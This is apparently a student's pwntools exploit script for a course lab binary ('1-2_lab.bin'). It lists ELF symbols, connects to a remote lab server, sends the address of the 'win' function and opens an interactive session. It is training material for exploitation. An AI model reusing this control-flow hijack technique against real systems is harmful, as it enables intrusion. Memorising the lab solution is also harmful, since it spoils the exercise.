from pwn import *

# Load ELF 
e = ELF("./1-2_lab.bin")

#
# Step 1: Find Target Symbol
#
#    This step prints all symbol
#    names and their corresponding
#    addresses found in the ELF binary.
#    It is used to identify the target
#    symbol for step 2.
#
'''
# Uncomment to Print all Symbol Addresses
for eachName, eachAddr in e.symbols.items():
    print(" {:<38}  {:<} {:>4}{:>}{:>} ".format(
    eachName,
    hex(eachAddr),
    '(', eachAddr, ')'))                    # Format and Print
'''


#
# Step 2: Exploit Vulnerability
#
#    This step establishes a connection
#    to the remote server, obtains the
#    symbol address ('win'), and then
#    exploits the vulnerability by
#    sending the symbol address as a
#    string to the server and starting
#    an interactive session.
#
"""
''' Establish Connection to Server '''
# p = process("./1-2_lab.bin")              # Uncomment to Test Script Locally
p = remote("csc748.hostbin.org", 7012)      # Test Script Against Server

''' Obtain Symbol Address '''
symbAddr = e.symbols['win']                 # Get Symbol Address
print(" {:>22}  {:<24} {:>4}{:>}{:>} ".format(
    "Symbol Address:",
    hex(symbAddr),
    '(', symbAddr, ')'))                    # Format and Print

''' Exploit Vulnerability '''
p.sendline(str(symbAddr))                       # Send Address as a String
p.interactive()                             # Start Interactive Session
"""